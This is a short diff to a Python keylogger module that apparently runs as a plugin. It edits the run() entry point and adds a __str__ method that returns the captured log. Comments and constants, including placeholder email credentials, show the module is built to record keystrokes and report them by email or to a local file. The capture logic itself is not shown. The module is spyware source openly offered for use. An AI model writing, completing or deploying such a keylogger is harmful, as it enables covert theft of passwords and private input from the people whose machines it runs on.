@@ -12,7 +12,6 @@ import time
 SEND_REPORT_EVERY = 30 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "email@provider.tld"
 EMAIL_PASSWORD = "password_here"
-return_msg = ""
 
 def run(**args):
     # if you want a keylogger to send to your email
@@ -20,12 +19,9 @@ def run(**args):
     # if you want a keylogger to record keylogs to a local file 
     # (and then send it using your favorite method)
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
-    return_msg = keylogger.start()
-    while True:
-        time.sleep(30)
-        if return_msg != "":
-            print("returnedsomething")
-            return return_msg
+    keylogger.start()
+    return keylogger    
+    
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
@@ -147,6 +143,8 @@ class Keylogger:
         print(f"{datetime.now()} - Started keylogger")
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
-        return self.log
+
+    def __str__(self):
+            return self.log
 
     
